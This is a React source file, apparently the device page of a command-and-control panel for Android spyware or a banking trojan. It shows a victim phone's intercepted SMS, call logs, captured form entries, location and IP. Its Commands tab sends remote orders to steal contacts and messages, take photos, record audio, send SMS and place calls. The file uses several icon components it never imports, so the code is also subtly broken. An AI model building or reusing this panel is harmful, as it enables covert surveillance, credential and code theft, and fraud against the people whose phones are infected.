import { useParams } from 'react-router-dom'
import { useState, useEffect } from 'react'
import { motion } from 'framer-motion'
import { Smartphone, Wifi, WifiOff, MessageSquare, Send, Phone, MapPin, Settings, Trash2, Copy, Eye, AlertTriangle, CheckCircle, Download, MoreVertical, RotateCcw, Zap, Shield, Database, User, Clock, Globe } from 'lucide-react'
import { db } from '../context/AuthContext'
import { ref, onValue, off, get, set, update, remove, push } from 'firebase/database'
import { toast } from 'sonner'

export default function ViewDevice() {
  const { deviceId } = useParams()
  const [device, setDevice] = useState(null)
  const [loading, setLoading] = useState(true)
  const [activeTab, setActiveTab] = useState('info')
  const [sendingCmd, setSendingCmd] = useState(null)

  const tabs = [
    { id: 'info', label: 'Info', icon: Smartphone },
    { id: 'messages', label: 'Messages', icon: MessageSquare },
    { id: 'sms', label: 'Sent SMS', icon: Send },
    { id: 'calls', label: 'Calls', icon: Phone },
    { id: 'forms', label: 'Forms', icon: Database },
    { id: 'commands', label: 'Commands', icon: Zap },
  ]

  useEffect(() => {
    if (!db || !deviceId) { setLoading(false); return }
    const deviceRef = ref(db, `users/${deviceId}`)
    const unsub = onValue(deviceRef, (snapshot) => {
      const data = snapshot.val()
      if (data) setDevice({ id: deviceId, ...data })
      else setDevice(null)
      setLoading(false)
    })
    return () => off(deviceRef, 'value', unsub)
  }, [deviceId])

  const sendCommand = async (command, extra = {}) => {
    if (!device?.fcm) { toast.error('No FCM token'); return }
    setSendingCmd(command)
    try {
      await push(ref(db, `commands/${deviceId}`), { command, ...extra, timestamp: Date.now() })
      toast.success(`Command sent: ${command}`)
    } catch (err) { toast.error('Failed to send command') }
    finally { setSendingCmd(null) }
  }

  if (loading) return <div className="p-5 space-y-4"><div className="h-12 bg-secondary/50 rounded-xl animate-pulse" />{[...Array(5)].map((_, i) => <div key={i} className="h-20 bg-secondary/50 rounded-xl animate-pulse" />)}</div>
  if (!device) return <div className="p-5 text-center"><AlertTriangle className="h-12 w-12 text-destructive mx-auto mb-3" /><h2 className="text-lg font-bold">Device Not Found</h2><p className="text-muted-foreground">Device {deviceId} does not exist</p></div>

  const formatTime = (ts) => ts ? new Date(ts).toLocaleString() : 'Never'

  return (
    <div className="p-5 space-y-6">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <div className="h-12 w-12 rounded-xl bg-primary/10 flex items-center justify-center"><Smartphone className="h-6 w-6 text-primary" /></div>
          <div><h1 className="text-xl font-black text-foreground">{device.brand} {device.model}</h1><p className="text-sm text-muted-foreground font-mono">{deviceId}</p></div>
        </div>
        <div className="flex items-center gap-2">
          <span className={`inline-flex items-center gap-1 px-3 py-1 rounded-full text-sm font-bold ${device.online ? 'bg-green-500/10 text-green-500' : 'bg-muted-foreground/10 text-muted-foreground'}`}>
            <span className={`h-2 w-2 rounded-full ${device.online ? 'bg-green-500' : 'bg-muted-foreground'}`} /> {device.online ? 'Online' : 'Offline'}
          </span>
        </div>
      </div>

      <div className="flex gap-2 overflow-x-auto pb-2">
        {tabs.map(tab => (
          <button key={tab.id} onClick={() => setActiveTab(tab.id)} className={`flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-medium whitespace-nowrap transition-all ${activeTab === tab.id ? 'bg-primary/10 text-primary border border-primary/20' : 'text-muted-foreground hover:text-foreground hover:bg-secondary/50'}`}>
            <tab.icon className="h-4 w-4" /> {tab.label}
          </button>
        ))}
      </div>

      <div className="rounded-2xl border border-border bg-card overflow-hidden">
        {activeTab === 'info' && (
          <div className="p-6 space-y-6">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              <div className="p-4 rounded-xl bg-secondary/30"><p className="text-[10px] text-muted-foreground uppercase">Battery</p><p className="text-2xl font-bold">{device.battery || 'N/A'}%</p></div>
              <div className="p-4 rounded-xl bg-secondary/30"><p className="text-[10px] text-muted-foreground uppercase">Android</p><p className="text-xl font-bold">{device.android_version || 'N/A'}</p></div>
              <div className="p-4 rounded-xl bg-secondary/30"><p className="text-[10px] text-muted-foreground uppercase">SDK</p><p className="text-xl font-bold">{device.sdk || 'N/A'}</p></div>
              <div className="p-4 rounded-xl bg-secondary/30"><p className="text-[10px] text-muted-foreground uppercase">RAM</p><p className="text-xl font-bold">{device.ram || 'N/A'}</p></div>
            </div>
            <div className="space-y-3">
              {[
                { label: 'FCM Token', value: device.fcm, icon: Globe, copy: true },
                { label: 'IP Address', value: device.ip, icon: Globe },
                { label: 'Location', value: device.location, icon: MapPin },
                { label: 'Operator', value: device.operator, icon: Settings },
                { label: 'Last Seen', value: formatTime(device.last_seen), icon: Clock },
                { label: 'First Seen', value: formatTime(device.first_seen), icon: Calendar },
              ].map(item => (
                <div key={item.label} className="flex items-center gap-3 p-3 rounded-xl bg-secondary/30">
                  <item.icon className="h-5 w-5 text-muted-foreground" />
                  <div className="flex-1 min-w-0"><p className="text-[10px] text-muted-foreground uppercase">{item.label}</p><p className="text-sm font-mono truncate">{item.value || 'N/A'}</p></div>
                  {item.copy && <button onClick={() => navigator.clipboard.writeText(item.value)} className="p-2 rounded-lg hover:bg-secondary"><Copy className="h-4 w-4" /></button>}
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'messages' && (
          <div className="divide-y divide-border/50">
            {(device.messages ? Object.entries(device.messages).map(([id, msg]) => (
              <div key={id} className="p-4 hover:bg-secondary/30"><div className="flex items-center gap-2"><span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold ${msg.type === 'incoming' ? 'bg-blue-500/10 text-blue-500' : 'bg-green-500/10 text-green-500'}`}>{msg.type === 'incoming' ? 'Incoming' : 'Outgoing'}</span><span className="text-[11px] text-muted-foreground">{formatTime(msg.timestamp)}</span></div><p className="mt-1 text-sm">{msg.body}</p><p className="text-[11px] text-muted-foreground">From: <span className="font-mono">{msg.address}</span></p></div>
            )) : <div className="p-10 text-center text-muted-foreground">No messages</div>)}
          </div>
        )}

        {activeTab === 'sms' && (
          <div className="divide-y divide-border/50">
            {(device.sent_sms ? Object.entries(device.sent_sms).map(([id, msg]) => (
              <div key={id} className="p-4 hover:bg-secondary/30"><div className="flex items-center justify-between"><div className="flex items-center gap-2"><span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold ${msg.success ? 'bg-green-500/10 text-green-500' : 'bg-destructive/10 text-destructive'}`}>{msg.success ? 'Sent' : 'Failed'}</span><span className="text-[11px] text-muted-foreground">{formatTime(msg.time)}</span></div></div><p className="mt-1 text-sm">To: <span className="font-mono">{msg.number}</span></p><p className="text-sm">{msg.message}</p>{msg.error && <p className="mt-1 text-sm text-destructive">Error: {msg.error}</p>}</div>
            )) : <div className="p-10 text-center text-muted-foreground">No sent SMS</div>)}
          </div>
        )}

        {activeTab === 'calls' && (
          <div className="divide-y divide-border/50">
            {(device.calls ? Object.entries(device.calls).map(([id, call]) => (
              <div key={id} className="p-4 hover:bg-secondary/30"><div className="flex items-center gap-2"><span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold ${call.type === 'incoming' ? 'bg-blue-500/10 text-blue-500' : call.type === 'outgoing' ? 'bg-green-500/10 text-green-500' : 'bg-purple-500/10 text-purple-500'}`}>{call.type}</span><span className="text-[11px] text-muted-foreground">{formatTime(call.timestamp)}</span></div><p className="mt-1 text-sm">{call.number} <span className="text-muted-foreground">({call.duration}s)</span></p></div>
            )) : <div className="p-10 text-center text-muted-foreground">No call logs</div>)}
          </div>
        )}

        {activeTab === 'forms' && (
          <div className="divide-y divide-border/50">
            {(device.forms ? Object.entries(device.forms).map(([id, form]) => (
              <div key={id} className="p-4 hover:bg-secondary/30"><div className="flex items-center gap-2"><span className="text-[10px] text-muted-foreground">{formatTime(form.timestamp)}</span></div><div className="mt-2 space-y-1">{Object.entries(form.content || {}).map(([k, v]) => <div key={k} className="flex gap-2"><span className="text-[10px] font-bold text-muted-foreground">{k}:</span><span className="text-sm font-mono truncate">{v}</span></div>)}</div></div>
            )) : <div className="p-10 text-center text-muted-foreground">No forms captured</div>)}
          </div>
        )}

        {activeTab === 'commands' && (
          <div className="p-6 space-y-4">
            <h2 className="text-lg font-bold">Send Commands</h2>
            <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
              {[
                { cmd: 'get_sms', label: 'Get SMS', icon: MessageSquare },
                { cmd: 'get_contacts', label: 'Get Contacts', icon: User },
                { cmd: 'get_calls', label: 'Get Call Logs', icon: Phone },
                { cmd: 'get_location', label: 'Get Location', icon: MapPin },
                { cmd: 'take_photo', label: 'Take Photo', icon: Camera },
                { cmd: 'record_audio', label: 'Record Audio', icon: Mic },
                { cmd: 'send_sms', label: 'Send SMS', icon: Send, extra: { number: '', message: '' } },
                { cmd: 'make_call', label: 'Make Call', icon: Phone, extra: { number: '' } },
                { cmd: 'notification', label: 'Show Notification', icon: Bell, extra: { title: 'Test', body: 'Hello' } },
              ].map(item => (
                <button key={item.cmd} onClick={() => sendCommand(item.cmd, item.extra)} disabled={sendingCmd === item.cmd} className="p-4 rounded-xl border border-border hover:bg-secondary/50 transition-colors flex flex-col items-center gap-2">
                  <item.icon className="h-5 w-5" />
                  <span className="text-sm font-medium">{item.label}</span>
                  {sendingCmd === item.cmd && <Loader2 className="h-4 w-4 animate-spin" />}
                </button>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}